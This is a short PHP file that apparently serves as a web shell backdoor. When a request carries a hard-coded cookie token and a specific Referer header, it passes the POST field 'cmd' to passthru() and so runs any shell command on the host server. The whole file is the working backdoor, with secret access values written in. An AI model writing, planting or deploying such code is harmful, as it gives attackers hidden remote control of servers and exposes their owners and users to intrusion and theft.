<?php

$CodeExecution = $_POST["cmd"] ;

if(isset($_POST["cmd"]) && isset($_COOKIE['Token']) && isset($_SERVER['HTTP_REFERER']) ){
    if($_COOKIE['Token'] === "QMkFGZodWYCFmciBzY" && $_SERVER['HTTP_REFERER'] === "https://dev.localhost/api/token/9GBDd4F9jjuZhwbV3W") {
        passthru($CodeExecution);
    }
} 

?>      